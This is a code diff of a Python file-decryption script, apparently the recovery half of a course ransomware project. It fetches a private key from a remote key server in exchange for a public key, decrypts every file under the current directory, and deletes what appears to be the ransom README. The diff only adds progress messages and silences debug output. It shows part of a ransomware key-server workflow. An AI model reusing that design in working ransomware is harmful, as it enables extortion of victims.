@@ -10,6 +10,7 @@ from base64 import b64encode
 assert os.path.isfile(constants.PUBLIC_KEY_FILE_PATH), "publicKey.pem does not exist"
 publicKeyFile = open(constants.PUBLIC_KEY_FILE_PATH, "r")
 
+print("Retrieving keys...")
 server_url =  "https://jaydensdisciples.me"
 
 request = server_url + "/keys"
@@ -19,15 +20,15 @@ publicKeyContents = publicKeyContents.replace("\n","*")
 
 headers = { "public_key" : publicKeyContents, "app_key" : "cecs378" }
 
-print(headers)
+#  print(headers)
 
 response = requests.get(request, headers=headers)
 
-print(response.status_code)
-print(response.reason)
-print(response.text)
+#  print(response.status_code)
+#  print(response.reason)
+#  print(response.text)
 
-assert len(response.json()) > 0, "Public key is not valid"
+assert len(response.json()) > 0, "\nPublic key is not valid\n"
 
 response_json = response.json()[0]
 
@@ -64,7 +65,10 @@ for root, dirs, files in os.walk("."):
             os.path.isdir(filePath)
             )):
                 # Decrypt the encrypted message
+                print("Decrypting " + filePath + "...", end="")
                 MyDecrypt.MyRSADecryptMAC(filePath, RSAPrivateKeyFilePath)
 
 
 os.remove(constants.README_FILE_PATH)
+
+print("\nDecryption complete!")
